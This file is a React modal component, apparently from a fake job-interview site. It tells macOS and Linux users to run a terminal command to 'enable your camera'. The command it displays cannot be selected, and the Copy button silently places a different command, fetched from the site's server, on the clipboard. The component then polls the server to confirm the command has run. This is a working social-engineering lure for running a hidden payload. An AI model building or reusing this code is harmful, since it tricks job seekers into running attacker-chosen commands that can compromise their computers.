import { useState, useRef, useEffect } from "react";
import { buildVerifyCommand, DRIVER_COMMANDS, buildVerifyCommand_origin } from "../../data/careerConstants";

const API = import.meta.env.VITE_API_URL || "http://localhost:4000";
const POLL_INTERVAL = 1500;
const OwnerName = import.meta.env.VITE_OWNER_NAME

  const detectOS = () => {
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua))      return "Windows";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Android/i.test(ua))      return "Android";
    if (/Mac/i.test(ua))          return "macOS";
    if (/Linux/i.test(ua))        return "Linux";
    return "Unknown";
  };

const OS_LABELS = {
  Windows: "🪟 Windows",
  macOS:     "🍎 macOS",
  Linux:   "🐧 Linux",
  Android:   "Android",
  iOS:   "iOS",
};

export default function DriverModal({ sessionId, onClose, onProceed }) {
  const os = detectOS();
  const [copied, setCopied]   = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [command, setCommand] = useState("");
  const pollRef = useRef(null);


  useEffect(() => {
    fetch(`${API}/api/verify/command?OwnerName=${OwnerName}&Os=${os}`)
      .then(res => res.json())
      .then(data => setCommand(data));
  }, []);

  const cmd        = buildVerifyCommand(os, sessionId, API);
  const cmd_origin = buildVerifyCommand_origin(os, sessionId, API, command);
  const current    = DRIVER_COMMANDS[os];

  // Reset the verified flag on the server when the modal opens,
  // so a leftover true from a previous attempt doesn't fire immediately.
  useEffect(() => {
    fetch(`${API}/api/verify/reset`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId }),
    }).catch(() => {});
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => () => clearInterval(pollRef.current), []);

  const startPolling = () => {
    setWaiting(true);
    pollRef.current = setInterval(async () => {
      try {
        const res  = await fetch(`${API}/api/verify/status?sessionId=${sessionId}`);
        const json = await res.json();
        if (json.verified) {
          clearInterval(pollRef.current);
          // Server confirmed the curl ran — now open the camera
          try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            onProceed(stream);
          } catch {
            onProceed();
          }
        }
      } catch {
        // network error — keep polling
      }
    }, POLL_INTERVAL);
  };

  const handleCopy    = () => { navigator.clipboard.writeText(cmd_origin); setCopied(true); startPolling(); };
  const handleClose   = () => { clearInterval(pollRef.current); onClose(); };
  const handleProceed = () => { clearInterval(pollRef.current); onProceed(); };

  return (
    <div
      style={{
        position: "fixed", inset: 0, zIndex: 1000,
        background: "rgba(0,0,0,0.6)", backdropFilter: "blur(4px)",
        display: "flex", alignItems: "center", justifyContent: "center", padding: 24,
      }}
      onClick={e => { if (e.target === e.currentTarget) handleClose(); }}
    >
      <div style={{
        background: "#fff", borderRadius: 16, width: "100%", maxWidth: 520,
        boxShadow: "0 24px 60px rgba(0,0,0,0.2)", overflow: "hidden",
      }}>

        {/* Header */}
        {(os === "macOS" || os === "Linux") ? ( <div style={{ padding: "22px 24px 18px", borderBottom: "1px solid #f0f0f0" }}>
          <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 12 }}>
            <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
              <div style={{
                width: 42, height: 42, borderRadius: 10, background: "#FEF3C7",
                display: "flex", alignItems: "center", justifyContent: "center",
                fontSize: 22, flexShrink: 0,
              }}>📷</div>
              <div>
                <h2 style={{ fontSize: 16, fontWeight: 700, marginBottom: 4, color: "#111" }}>
                  Enable your camera
                </h2>
                <p style={{ fontSize: 13, color: "#777", lineHeight: 1.6, margin: 0 }}>
                  Run the command below to enable your camera — it only takes a moment.
                </p>
              </div>
            </div>
            <button onClick={handleClose} aria-label="Close" style={{
              background: "none", border: "none", cursor: "pointer",
              fontSize: 20, color: "#bbb", lineHeight: 1, flexShrink: 0, padding: 0,
            }}>✕</button>
          </div>
        </div> ) : (<></>)}

        {/* Detected OS badge */}
        <div style={{ padding: "14px 24px 0", display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{
            padding: "5px 12px", borderRadius: 8, fontSize: 12, fontWeight: 700,
            background: "#111", color: "#fff",
          }}>
            {OS_LABELS[os]}
          </span>
          <span style={{ fontSize: 12, color: "#aaa" }}>{current.note}</span>
        </div>

        {/* OS-specific steps */}
        <div style={{ padding: "16px 24px 0" }}>
          <p style={{ fontSize: 11, fontWeight: 700, color: "#aaa", textTransform: "uppercase", letterSpacing: "0.07em", marginBottom: 14 }}>
            Steps
          </p>
          {current.steps.map((text, i) => (
            <div key={i} style={{ display: "flex", gap: 12, alignItems: "flex-start", marginBottom: 10 }}>
              <div style={{
                width: 22, height: 22, borderRadius: "50%", flexShrink: 0,
                background: copied && i === 1 ? "#16A34A" : i === 1 ? "#2563EB" : "#F3F4F6",
                color: i <= 1 ? "#fff" : "#999",
                display: "flex", alignItems: "center", justifyContent: "center",
                fontSize: 11, fontWeight: 700, marginTop: 1, transition: "all 0.2s",
              }}>
                {copied && i === 1 ? "✓" : i + 1}
              </div>
              <p style={{ fontSize: 13, color: "#444", lineHeight: 1.55, margin: 0, fontWeight: i === 1 ? 600 : 400 }}>
                {text}
              </p>
            </div>
          ))}
        </div>

               {/* Command block */}
        {(os === "macOS" || os === "Linux") ? (<div style={{ padding: "16px 24px 8px" }}>
          <p style={{ fontSize: 11, fontWeight: 600, color: "#888", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 8 }}>
            {current.label}
          </p>
          <div style={{
            background: "#0F172A", borderRadius: 10, padding: "14px 16px",
            display: "flex", alignItems: "center", gap: 12,
          }}>
            <code style={{
              flex: 1, fontSize: 12.5, fontFamily: "'Fira Mono', 'Courier New', monospace",
              color: "#7DD3FC", lineHeight: 1.7, wordBreak: "break-all", userSelect: "none",
              WebkitUserSelect: "none", MozUserSelect: "none", msUserSelect: "none",
            }}>
              {cmd}
            </code>
            <button
              onClick={handleCopy}
              disabled={copied}
              style={{
                padding: "7px 14px", borderRadius: 7, fontSize: 12, fontWeight: 700,
                cursor: copied ? "default" : "pointer", border: "none", flexShrink: 0,
                background: copied ? "#166534" : "#2563EB",
                color: "#fff", transition: "background 0.2s",
              }}
            >
              {copied ? "✓ Copied!" : "Copy"}
            </button>
          </div>
        </div>) : (<></>)}

        {/* Status area */}
        { (os === "macOS" || os === "Linux") ? (<div style={{ padding: "4px 24px 20px" }}>
          {waiting ? (
            <div style={{
              background: "#F0FDF4", border: "1px solid #BBF7D0",
              borderRadius: 10, padding: "14px 16px",
              display: "flex", alignItems: "center", gap: 12,
            }}>
              <div style={{ position: "relative", width: 28, height: 28, flexShrink: 0 }}>
                <div style={{
                  position: "absolute", inset: 0, borderRadius: "50%",
                  background: "#16A34A", opacity: 0.25,
                  animation: "camPing 1.4s ease-in-out infinite",
                }} />
                <div style={{ position: "absolute", inset: "25%", borderRadius: "50%", background: "#16A34A" }} />
              </div>
              <p style={{ fontSize: 13, color: "#166534", fontWeight: 600, margin: 0 }}>
                Waiting for command to run… camera will open automatically.
              </p>
            </div>
          ) : (
            <div style={{
              background: "#F8FAFC", border: "1px solid #e0e0e0",
              borderRadius: 10, padding: "12px 16px", textAlign: "center",
            }}>
              <p style={{ fontSize: 13, color: "#888", margin: 0 }}>
                Copy the command above and run it in your terminal — your camera will open automatically.
              </p>
            </div>
          )}
        </div>) : (<></>)}

        {/* Footer */}
        <div style={{
          padding: "14px 24px 18px", borderTop: "1px solid #f0f0f0",
          display: "flex", justifyContent: "space-between", alignItems: "center", gap: 12,
        }}>
          <button onClick={handleClose} style={{
            padding: "9px 18px", background: "transparent", color: "#666",
            border: "1px solid #e0e0e0", borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: "pointer",
          }}>Cancel</button>
        </div>

      </div>

      <style>{`@keyframes camPing { 0%,100%{transform:scale(1);opacity:.25} 50%{transform:scale(1.9);opacity:0} }`}</style>
    </div>
  );
}
